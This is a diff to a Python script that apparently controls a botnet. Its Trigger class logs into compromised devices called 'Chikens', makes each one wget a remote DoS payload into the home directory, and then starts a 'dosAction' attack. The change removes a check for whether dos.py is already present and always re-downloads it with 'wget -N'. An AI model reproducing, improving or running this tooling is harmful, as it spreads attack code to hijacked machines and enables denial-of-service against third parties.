@@ -23,26 +23,12 @@ class Trigger(object):
             devs.append(dev)
         return devs
 
-    def checkIN(self,devs):
-        fileisINs = []
-        for dev in devs:
-            dev.write(b'ls'+b'\n')
-            buff = dev.read_until(b'$')
-            buff = str(buff,encoding='utf-8')
-            matched = re.search(r'\bdos.py\b', buff, re.M)
-            if matched:
-                fileisIN = True
-            else:
-                fileisIN = False
-            fileisINs.append(fileisIN)
-        return fileisINs
-
     def dosDownLoad(self,devs,path):
         for dev in devs:
             dev.write(b'cd ~' + b'\n')
 
             dev.read_until(b'$')
-            dev.write(b'wget '+ path + b'\n')
+            dev.write(b'wget -N '+ path + b'\n')
             dev.read_until(b'$')
 
     def dosAction(self,devs):
@@ -69,8 +55,7 @@ if __name__ == '__main__':
 
     hack = Trigger()
     devs = hack.login(Chikens)
-    if not hack.checkIN(devs):
-        hack.dosDownLoad(devs,path)
+    hack.dosDownLoad(devs,path)
     time.sleep(1)
     hack.dosAction(devs)
     hack.signout(devs)
